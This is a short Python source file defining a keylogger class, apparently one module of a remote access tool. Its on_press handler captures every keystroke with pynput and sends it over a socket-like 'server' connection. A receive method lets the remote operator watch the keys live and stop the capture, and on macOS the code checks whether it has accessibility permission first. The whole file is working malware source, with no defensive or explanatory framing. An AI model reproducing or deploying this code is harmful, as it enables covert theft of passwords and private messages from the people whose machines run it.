from pynput.keyboard import Key, Listener
from outputs import Output
import platform

class Keylogger:
	def __init__(self, server):
		self.server = server

	def on_press(self, key):
		key = str(key).replace("'", "")

		if key == 'Key.space':
			key = ' '
		if key == 'Key.shift_r':
			key = ''
		if key == "Key.enter":
			key = '\n'
		self.server.send(key)
		status = self.server.recv()
		if status == "STOP":
			return False

	def record(self):
		if platform.system() == 'Darwin':
			import HIServices
			trusted = HIServices.AXIsProcessTrusted()
		else:
			trusted = True

		self.server.send(str(trusted))
		if not trusted:
			return
		with Listener(on_press=self.on_press) as listener :
			listener.join()

	def receive(self):
		if self.server.recv() == "False":
			Output.error("Current application doesn't have permission "
				"to listen to keystrokes.")
			return
		try:
			while True:
				key = self.server.recv()
				self.server.send("received")
				print(key, end='', flush=True)

		except KeyboardInterrupt:
			self.server.send("STOP")
			self.server.recv()
